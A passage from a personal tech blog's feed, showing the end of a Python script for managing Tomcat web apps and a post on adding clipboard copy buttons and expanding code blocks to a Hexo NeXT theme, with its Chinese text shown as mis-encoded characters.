os.system(change_port[port])</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">config_app_manage_shell</span><span class="params">(self)</span>:</span></div><div class="line">        customize_print(<span class="string">"%s æ·»åŠ ç®¡ç†è„šæœ¬"</span> % self.name)</div><div class="line">        copy_shell_script = <span class="string">'cp -f '</span> + shell_script + <span class="string">' '</span> + self.manage_shell_file</div><div class="line">        os.system(copy_shell_script)</div><div class="line">        config_script_app_name = <span class="string">"sed -i 's/app=/app=\""</span> + self.name + <span class="string">"\"/' "</span> + self.manage_shell_file</div><div class="line">        os.system(config_script_app_name)</div><div class="line">        config_script_war_url = <span class="string">"sed -i 's#war_url=#war_url=\""</span> + self.app_download_url + <span class="string">"\"#' "</span> + self.manage_shell_file</div><div class="line">        os.system(config_script_war_url)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">status_app</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line"><span class="string">        :return: 0æä¾›æœåŠ¡ï¼Œ1åœæ­¢ï¼Œ2æœªæä¾›æœåŠ¡</span></div><div class="line"><span class="string">        """</span></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            result = subprocess.check_output([<span class="string">'sh'</span>, self.manage_shell_file, <span class="string">'status'</span>])</div><div class="line">        <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</div><div class="line">            result = e.output</div><div class="line">        <span class="keyword">if</span> <span class="string">'run'</span> <span class="keyword">in</span> result:</div><div class="line">            <span class="keyword">if</span> <span class="string">'is provide services'</span> <span class="keyword">in</span> result:</div><div class="line">                customize_print(<span class="string">"åº”ç”¨ %s æˆåŠŸå¯åŠ¨å¹¶æä¾›æœåŠ¡"</span> % self.name)</div><div class="line">                <span class="keyword">return</span> <span class="number">0</span></div><div class="line">            <span class="keyword">elif</span> <span class="string">'but'</span> <span class="keyword">in</span> result:</div><div class="line">                customize_print(<span class="string">"åº”ç”¨ %s è¿›ç¨‹å­˜åœ¨ä½†æœªæä¾›æœåŠ¡"</span> % self.name, <span class="number">2</span>)</div><div class="line">                <span class="keyword">return</span> <span class="number">2</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            customize_print(<span class="string">"åº”ç”¨ %s ä»¥åœæ­¢"</span> % self.name, <span class="number">1</span>)</div><div class="line">            <span class="keyword">return</span> <span class="number">1</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">manage</span><span class="params">(self, operate)</span>:</span></div><div class="line">        os.system(<span class="string">'sh %s %s'</span> % (self.manage_shell_file, operate))</div><div class="line">        </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">(self)</span>:</span></div><div class="line">        self.create_app()</div><div class="line">        self.config_app_port()</div><div class="line">        self.config_app_manage_shell()</div><div class="line">        self.manage(<span class="string">"upgrade"</span>)</div><div class="line">        self.manage(<span class="string">"stop"</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">restart</span><span class="params">(self)</span>:</span></div><div class="line">        self.manage(<span class="string">"stop"</span>)</div><div class="line">        self.manage(<span class="string">"start"</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></div><div class="line">        self.manage(<span class="string">"start"</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stop</span><span class="params">(self)</span>:</span></div><div class="line">        self.manage(<span class="string">"stop"</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(self)</span>:</span></div><div class="line">        self.manage(<span class="string">"log"</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upgrade</span><span class="params">(self)</span>:</span></div><div class="line">        self.lock_config_file()</div><div class="line">        self.manage(<span class="string">"upgrade"</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lock_config_file</span><span class="params">(self)</span>:</span></div><div class="line">        cmd = <span class="string">'find '</span> + self.webapp_dir + <span class="string">' -name db*properties -o -name config_base_*|xargs chattr +i &gt;/dev/null 2&gt;&amp;1'</span></div><div class="line">        customize_print(<span class="string">"é”é…ç½®æ–‡ä»¶"</span>, <span class="number">2</span>)</div><div class="line">        os.system(cmd)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unlock_config_file</span><span class="params">(self)</span>:</span></div><div class="line">        cmd = <span class="string">'find '</span> + self.webapp_dir + <span class="string">' -name db*properties -o -name config_base_*|xargs chattr -i &gt;/dev/null 2&gt;&amp;1'</span></div><div class="line">        customize_print(<span class="string">"è§£é”é…ç½®æ–‡ä»¶"</span>, <span class="number">2</span>)</div><div class="line">        os.system(cmd)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dash_board</span><span class="params">(apps, operate)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line"><span class="string">    ä¸»ç®¡ç†ç¨‹åºï¼Œè°ƒç”¨</span></div><div class="line"><span class="string">    :param operate: åº”ç”¨æ“ä½œ</span></div><div class="line"><span class="string">    :param apps: apps ä¸ºlist</span></div><div class="line"><span class="string">    """</span></div><div class="line">    <span class="keyword">for</span> app <span class="keyword">in</span> apps:</div><div class="line">        app_obj = TomcatAppsManage(app)</div><div class="line">        main_dict = &#123;</div><div class="line">            <span class="string">"init"</span>: app_obj.init,</div><div class="line">            <span class="string">"shell"</span>: app_obj.config_app_manage_shell,</div><div class="line">            <span class="string">"status"</span>: app_obj.status_app,</div><div class="line">            <span class="string">"start"</span>: app_obj.start,</div><div class="line">            <span class="string">"stop"</span>: app_obj.stop,</div><div class="line">            <span class="string">"restart"</span>: app_obj.restart,</div><div class="line">            <span class="string">"upgrade"</span>: app_obj.upgrade,</div><div class="line">            <span class="string">"log"</span>: app_obj.log,</div><div class="line">            <span class="string">"lock"</span>: app_obj.lock_config_file,</div><div class="line">            <span class="string">"unlock"</span>: app_obj.unlock_config_file,</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            main_dict[operate]()</div><div class="line">        <span class="keyword">except</span> KeyError <span class="keyword">as</span> e:</div><div class="line">            customize_print(help_msg)</div><div class="line"></div><div class="line"></div><div class="line">help_msg = <span class="string">"""</span></div><div class="line"><span class="string">ä½¿ç”¨æ–¹æ³•ï¼š</span></div><div class="line"><span class="string">    1 log</span></div><div class="line"><span class="string">    all status</span></div><div class="line"><span class="string">    ç®¡ç†åº”ç”¨ç¼–å· æ“ä½œ</span></div><div class="line"><span class="string">æ“ä½œï¼š</span></div><div class="line"><span class="string">    lock        é”é…ç½®æ–‡ä»¶</span></div><div class="line"><span class="string">    unlock      è§£é”é…ç½®æ–‡ä»¶</span></div><div class="line"><span class="string">    init        é…ç½®tomcatç›‘å¬ç«¯å£</span></div><div class="line"><span class="string">    shell       é…ç½®webappæ§åˆ¶è„šæœ¬</span></div><div class="line"><span class="string">    statusï¼Œstartï¼Œrestart, logï¼Œupgradeï¼Œstop åº”ç”¨æ“ä½œ</span></div><div class="line"><span class="string">"""</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    app_list = []</div><div class="line">    <span class="keyword">for</span> index, app_name <span class="keyword">in</span> enumerate(config_data, <span class="number">1</span>):</div><div class="line">        <span class="keyword">print</span> <span class="string">"\033[94m %s:  %s \033[0m"</span> % (index, app_name)</div><div class="line">        app_list.append(app_name)</div><div class="line">    choice = raw_input(<span class="string">"è¾“å…¥è¦ç®¡ç†çš„æœåŠ¡:  "</span>)</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        app_index = choice.split()[<span class="number">0</span>]</div><div class="line">        operate = choice.split()[<span class="number">1</span>]</div><div class="line">        <span class="keyword">if</span> app_index.isdigit():</div><div class="line">            app_index = int(app_index)</div><div class="line">            <span class="keyword">if</span> len(app_list) &gt;= app_index &gt; <span class="number">0</span>:</div><div class="line">                app_name = app_list[app_index - <span class="number">1</span>]</div><div class="line">                dash_board(app_name.split(), operate)</div><div class="line">        <span class="keyword">elif</span> app_index == <span class="string">"all"</span>:</div><div class="line">            dash_board(app_list, operate)</div><div class="line">    <span class="keyword">except</span> ValueError <span class="keyword">and</span> IndexError:</div><div class="line">        customize_print(<span class="string">"å‚æ•°è¾“å…¥é”™è¯¯"</span>, <span class="number">1</span>)</div><div class="line">        customize_print(help_msg)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        dash_board(sys.argv[<span class="number">1</span>].split(), sys.argv[<span class="number">2</span>])</div><div class="line">    <span class="keyword">except</span> IndexError:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">                main()</div><div class="line">        <span class="keyword">except</span> KeyboardInterrupt:</div><div class="line">            customize_print(<span class="string">"Bye!"</span>)</div></pre></div></div></figure><hr><h1 id="0x02-å¼€å§‹åˆå§‹åŒ–éƒ¨ç½²"><a href="#0x02-å¼€å§‹åˆå§‹åŒ–éƒ¨ç½²" class="headerlink" title="0x02 å¼€å§‹åˆå§‹åŒ–éƒ¨ç½²"></a>0x02 å¼€å§‹åˆå§‹åŒ–éƒ¨ç½²</h1><p>æ‰§è¡Œ<code>tomcat_manager</code></p><p><img src="https://kionf.com/article_images/tomcat-manager.png" alt="kionf"></p><blockquote><p><code>all init</code> è‡ªåŠ¨åˆå§‹åŒ–éƒ¨ç½²æ‰€æœ‰é¡¹ç›®, å…¶ä»–å…·ä½“ä½¿ç”¨æ–¹æ³•è§å¸®åŠ©ä¿¡æ¯</p></blockquote><hr>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
          <category> Tomcat </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hexo nextä»£ç ç‰‡æ®µæ·»åŠ ä»£ç å—å¤åˆ¶å’Œé•¿ä»£ç è‡ªåŠ¨å±•å¼€</title>
      <link href="/2018/06/28/blog-next/"/>
      <url>/2018/06/28/blog-next/</url>
      <content type="html"><![CDATA[<p><img src="https://kionf.com/article_images/blog-code.png" alt="kionf"></p><blockquote class="blockquote-center"><p>æ·»åŠ é¼ æ ‡ç§»åŠ¨åˆ°é•¿ä»£ç å—, è‡ªåŠ¨å±•å¼€.  ä»£ç å—å¤åˆ¶æŒ‰é’®åŠå®šåˆ¶</p></blockquote><a id="more"></a><h1 id="0x00-æ·»åŠ ç¬¬ä¸‰æ–¹jsæ’ä»¶clipboard-js"><a href="#0x00-æ·»åŠ ç¬¬ä¸‰æ–¹jsæ’ä»¶clipboard-js" class="headerlink" title="0x00 æ·»åŠ ç¬¬ä¸‰æ–¹jsæ’ä»¶clipboard.js"></a>0x00 æ·»åŠ ç¬¬ä¸‰æ–¹jsæ’ä»¶<a href="https://clipboardjs.com/" target="_blank" rel="noopener">clipboard.js</a></h1><ul><li><i class="fa fa-download"></i> <a href="https://raw.githubusercontent.com/zenorocha/clipboard.js/master/dist/clipboard.min.js" target="_blank" rel="noopener">ä¸‹è½½</a></li></ul><blockquote><p> ./themes/next/source/lib/zclip/clipboard.min.js <code>æ–°å¢</code></p></blockquote><hr><h1 id="0x01-æ’å…¥è‡ªå®šä¹‰javascript"><a href="#0x01-æ’å…¥è‡ªå®šä¹‰javascript" class="headerlink" title="0x01 æ’å…¥è‡ªå®šä¹‰javascript"></a>0x01 æ’å…¥è‡ªå®šä¹‰javascript</h1><p>æ–°å¢<code>custom.js</code>æ–‡ä»¶, ç›®å½•å¦‚ä¸‹</p><blockquote><p>./themes/next/source/js/src/custom.js <code>æ–°å¢</code></p></blockquote><figure class="highlight js"><figcaption><span class="fileDir">./themes/next/source/js/src/</span><span class="caption">custom</span><span class="suffix">.js</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">var</span> browserHeight = <span class="built_in">document</span>.documentElement.clientHeight || <span class="built_in">document</span>.body.clientHeight;</div><div class="line"><span class="keyword">var</span> scrollTop = <span class="built_in">document</span>.documentElement.scrollTop || <span class="built_in">document</span>.body.scrollTop;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">createCopyBtns</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// åˆ›å»ºå¤åˆ¶button å¯¹è±¡</span></div><div class="line">    <span class="keyword">var</span> $figure = $(<span class="string">"figure .figcode"</span>);</div><div class="line">    <span class="keyword">if</span> ($figure.length &gt; <span class="number">0</span>) &#123;</div><div class="line">        $(<span class="string">".post-body"</span>).before(<span class="string">'&lt;div id="copyBtn" &gt;&lt;span id="imgCopy" &gt;&lt;i class="fa fa-paste fa-fw"&gt;&lt;/i&gt;&lt;/span&gt;&lt;span id="imgSuccess" style="display: none;color: #6FB76F;"&gt;&lt;i class="fa fa-check-circle fa-fw" aria-hidden="true"&gt;&lt;/i&gt;&lt;/span&gt;'</span>);</div><div class="line">        $figure.append(<span class="string">'&lt;div class="codePinBtn"&gt;&lt;img id="imgSuccess" src="/article_images/png/Pin_green.png" style="border:none; width: 24px;"&gt;&lt;/div&gt;'</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> $codeArea = $(<span class="string">"figure .code"</span>);</div><div class="line">    <span class="keyword">if</span> ($codeArea.length &gt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">changeToSuccess</span>(<span class="params">item</span>) </span>&#123;</div><div class="line">            $imgOK = $(<span class="string">"#copyBtn"</span>).find(<span class="string">"#imgSuccess"</span>);</div><div class="line">            <span class="keyword">if</span> ($imgOK.css(<span class="string">"display"</span>) == <span class="string">"none"</span>) &#123;</div><div class="line">                $imgOK.css(&#123;</div><div class="line">                    opacity: <span class="number">0</span>,</div><div class="line">                    display: <span class="string">"block"</span></div><div class="line">                &#125;);</div><div class="line">                $imgOK.animate(&#123;</div><div class="line">                    opacity: <span class="number">1</span></div><div class="line">                &#125;, <span class="number">1000</span>);</div><div class="line">                setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                    $imgOK.animate(&#123;</div><div class="line">                        opacity: <span class="number">0</span></div><div class="line">                    &#125;, <span class="number">2000</span>);</div><div class="line">                &#125;, <span class="number">2000</span>);</div><div class="line">                setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                    $imgOK.css(<span class="string">"display"</span>, <span class="string">"none"</span>);</div><div class="line">                &#125;, <span class="number">4000</span>);</div><div class="line">            &#125;</div><div class="line">            ;</div><div class="line">        &#125;;</div><div class="line"></div><div class="line">        <span class="keyword">var</span> clipboard = <span class="keyword">new</span> ClipboardJS(<span class="string">'#copyBtn'</span>, &#123;</div><div class="line">            <span class="comment">// å®šåˆ¶ç­›é€‰å¤åˆ¶</span></div><div class="line">            target: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                <span class="keyword">var</span> node = <span class="built_in">document</span>.querySelector(<span class="string">"[copyFlag]"</span>);</div><div class="line">                <span class="keyword">var</span> child = node.querySelector(<span class="string">".diff-deletion"</span>);</div><div class="line">                <span class="keyword">if</span> (child != <span class="literal">null</span>) &#123;</div><div class="line">                    <span class="keyword">var</span> pre = node.querySelector(<span class="string">"pre"</span>).cloneNode(<span class="literal">true</span>);</div><div class="line">                    child = pre.querySelector(<span class="string">".diff-deletion"</span>);</div><div class="line">                    <span class="keyword">while</span> (child != <span class="literal">null</span>) &#123;</div><div class="line">                        pre.removeChild(child)</div><div class="line">                        child = pre.querySelector(<span class="string">".diff-deletion"</span>);</div><div class="line">                    &#125;</div><div class="line">                    <span class="keyword">var</span> node = <span class="built_in">document</span>.getElementById(<span class="string">'tmpcopy'</span>);</div><div class="line">                    <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</div><div class="line">                        node = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</div><div class="line">                        node.id = <span class="string">'tmpcopy'</span>;</div><div class="line">                        node.style.position = <span class="string">'fixed'</span>;</div><div class="line">                        node.style.width = <span class="string">'0'</span>;</div><div class="line">                        node.style.height = <span class="string">'0'</span>;</div><div class="line">                        <span class="built_in">document</span>.body.appendChild(node);</div><div class="line">                    &#125;</div><div class="line">                    node.innerHTML = <span class="string">''</span>;</div><div class="line">                    node.appendChild(pre);</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">return</span> node;</div><div class="line">            &#125;,</div><div class="line">            isSupported: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                alert(<span class="keyword">this</span>.support);</div><div class="line">                <span class="keyword">return</span> <span class="built_in">document</span>.querySelector(<span class="string">"[copyFlag]"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line"></div><div class="line">        clipboard.on(<span class="string">'success'</span>,</div><div class="line">            <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</div><div class="line">                e.clearSelection();</div><div class="line">                changeToSuccess(e);</div><div class="line">                <span class="keyword">var</span> node = <span class="built_in">document</span>.getElementById(<span class="string">"tmpcopy"</span>);</div><div class="line">                <span class="keyword">if</span> (node != <span class="literal">null</span>) node.innerHTML = <span class="string">''</span>;</div><div class="line">            &#125;);</div><div class="line"></div><div class="line">        clipboard.on(<span class="string">'error'</span>,</div><div class="line">            <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</div><div class="line">                <span class="built_in">console</span>.error(<span class="string">'Action:'</span>, e.action);</div><div class="line">                <span class="built_in">console</span>.error(<span class="string">'Trigger:'</span>, e.trigger);</div><div class="line">            &#125;);</div><div class="line">        $(<span class="string">"#copyBtn"</span>).hover(</div><div class="line">            <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                $(<span class="keyword">this</span>).stop();</div><div class="line">                $(<span class="keyword">this</span>).css(<span class="string">"opacity"</span>, <span class="number">1</span>);</div><div class="line">            &#125;,</div><div class="line">            <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                $(<span class="keyword">this</span>).animate(&#123;</div><div class="line">                    opacity: <span class="number">0</span></div><div class="line">                &#125;, <span class="number">2000</span>);</div><div class="line">            &#125;</div><div class="line">        );</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">FigureHover</span>(<span class="params">figure</span>) </span>&#123;</div><div class="line">    <span class="comment">// ç§»åŠ¨é¼ æ ‡æ‹‰ä¼¸æ˜¾ç¤ºä»£ç </span></div><div class="line">    <span class="keyword">var</span> block = $(figure).attr(<span class="string">"block"</span>);</div><div class="line">    <span class="keyword">if</span> (block != <span class="number">1</span>) &#123;</div><div class="line">        <span class="keyword">var</span> codeArea = $(figure).find(<span class="string">".code"</span>)[<span class="number">0</span>];</div><div class="line">        <span class="keyword">var</span> width_code = codeArea.clientWidth;</div><div class="line">        <span class="keyword">var</span> width_Scroll = codeArea.scrollWidth;</div><div class="line">        <span class="keyword">var</span> width_Margin = -<span class="built_in">parseInt</span>($(figure).css(<span class="string">"marginRight"</span>));</div><div class="line">        $codePinBtn = $(figure).find(<span class="string">".codePinBtn"</span>);</div><div class="line"></div><div class="line">        <span class="keyword">var</span> width_Hide = width_Scroll - (width_code - width_Margin);</div><div class="line">        <span class="keyword">if</span> (width_Hide &gt; <span class="number">0</span>) &#123;</div><div class="line">            $(figure).stop();</div><div class="line"></div><div class="line">            $codePinBtn.stop();</div><div class="line">            <span class="keyword">var</span> width_Main = $(<span class="string">"#main"</span>).width();</div><div class="line">            <span class="keyword">var</span> width_Base = $(<span class="string">".main-inner"</span>).width();</div><div class="line">            <span class="keyword">var</span> width_Blank = (width_Main - width_Base) / <span class="number">2</span> - <span class="number">10</span>;</div><div class="line"></div><div class="line">            <span class="keyword">if</span> (width_Blank &gt; <span class="number">0</span>) &#123;</div><div class="line">                <span class="keyword">if</span> (width_Hide &lt; width_Blank) &#123;</div><div class="line">                    width_Margin = width_Hide; <span class="comment">//ç©ºç™½åŒºåŸŸè¶³å¤Ÿç›´æ¥æ˜¾ç¤º å…¨éƒ¨</span></div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                    width_Margin = width_Blank * <span class="number">0.8</span>;</div><div class="line">                &#125;</div><div class="line">                $(figure).animate(&#123;<span class="attr">marginRight</span>: -width_Margin&#125;);</div><div class="line">                $codePinBtn.animate(&#123;<span class="attr">opacity</span>: <span class="number">1</span>&#125;);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        ;</div><div class="line">    &#125;</div><div class="line">    ;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">FigureHoverOut</span>(<span class="params">figure</span>) </span>&#123;</div><div class="line">    <span class="comment">// é¼ æ ‡ç§»é™¤ä»£ç å—</span></div><div class="line">    $(<span class="string">"#copyBtn"</span>).animate(&#123;</div><div class="line">        opacity: <span class="number">0</span></div><div class="line">    &#125;, <span class="number">2000</span>);</div><div class="line">    <span class="keyword">var</span> block = $(figure).attr(<span class="string">"block"</span>);</div><div class="line">    <span class="keyword">if</span> (block != <span class="number">1</span>) &#123;</div><div class="line">        $(figure).stop();</div><div class="line">        $(figure).animate(&#123;<span class="attr">marginRight</span>: <span class="string">"0"</span>&#125;);</div><div class="line">        <span class="keyword">var</span> $codePinBtn = $(figure).find(<span class="string">".codePinBtn"</span>);</div><div class="line">        $codePinBtn.stop();</div><div class="line">        $codePinBtn.css(&#123;<span class="attr">opacity</span>: <span class="number">0</span>&#125;);</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">$(<span class="string">"figure"</span>).hover(</div><div class="line">    <span class="comment">// é¼ æ ‡ç§»å…¥ä»£ç å—</span></div><div class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">        FigureHover(<span class="keyword">this</span>);</div><div class="line">        <span class="keyword">var</span> block = $(<span class="keyword">this</span>).attr(<span class="string">"block"</span>);</div><div class="line">        <span class="comment">//-------é¼ æ ‡æ´»åŠ¨åœ¨ä»£ç å—å†…</span></div><div class="line">        <span class="comment">//ç§»é™¤ä¹‹å‰å«æœ‰å¤åˆ¶æ ‡å¿—ä»£ç å—çš„ copyFlag</span></div><div class="line">        $(<span class="string">"[copyFlag]"</span>).removeAttr(<span class="string">"copyFlag"</span>);</div><div class="line">        <span class="comment">//åœ¨æ–°çš„ï¼ˆå½“å‰é¼ æ ‡æ‰€åœ¨ä»£ç åŒºï¼‰ä»£ç å—æ’å…¥æ ‡å¿—ï¼šcopyFlag</span></div><div class="line">        $(<span class="keyword">this</span>).find(<span class="string">".code"</span>).attr(<span class="string">"copyFlag"</span>, <span class="number">1</span>);</div><div class="line">        <span class="comment">//è·å–å¤åˆ¶æŒ‰é’®</span></div><div class="line">        $copyBtn = $(<span class="string">"#copyBtn"</span>);</div><div class="line">        <span class="keyword">if</span> ($copyBtn.lenght != <span class="number">0</span>) &#123;</div><div class="line">            <span class="comment">//è·å–åˆ°æŒ‰é’®çš„å‰æä¸‹è¿›è¡Œä¸€ä¸‹æ“ä½œ</span></div><div class="line">            <span class="comment">//åœæ­¢æŒ‰é’®åŠ¨ç”»æ•ˆæœ</span></div><div class="line">            <span class="comment">//è®¾ç½®ä¸º æ˜¾ç¤ºçŠ¶æ€</span></div><div class="line">            <span class="comment">//ä¿®æ”¹ å¤åˆ¶æŒ‰é’® ä½ç½®åˆ° å½“å‰ä»£ç å—å¼€å§‹éƒ¨ä½</span></div><div class="line">            <span class="comment">//è®¾ç½®ä»£ç å— å·¦ä¾§ä½ç½®</span></div><div class="line">            $copyBtn.stop();</div><div class="line">            $copyBtn.css(<span class="string">"opacity"</span>, <span class="number">0.8</span>);</div><div class="line">            $copyBtn.css(<span class="string">"display"</span>, <span class="string">"block"</span>);</div><div class="line">            $copyBtn.css(<span class="string">"top"</span>, <span class="built_in">parseInt</span>($copyBtn.css(<span class="string">"top"</span>)) + $(<span class="keyword">this</span>).offset().top - $copyBtn.offset().top + <span class="number">3</span>);</div><div class="line">            $copyBtn.css(<span class="string">"left"</span>, -$copyBtn.width() - <span class="number">3</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;,</div><div class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">        FigureHoverOut(<span class="keyword">this</span>);</div><div class="line">    &#125;,</div><div class="line">);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">btnPinClick</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> figure = <span class="keyword">this</span>.parentElement.parentElement;</div><div class="line">    <span class="keyword">var</span> block = $(figure).attr(<span class="string">"block"</span>);</div><div class="line">    <span class="keyword">if</span> (block != <span class="number">1</span>) &#123;</div><div class="line">        $(<span class="string">".post-body"</span>).css(<span class="string">"transform"</span>, <span class="string">"none"</span>);</div><div class="line">        $(figure).attr(<span 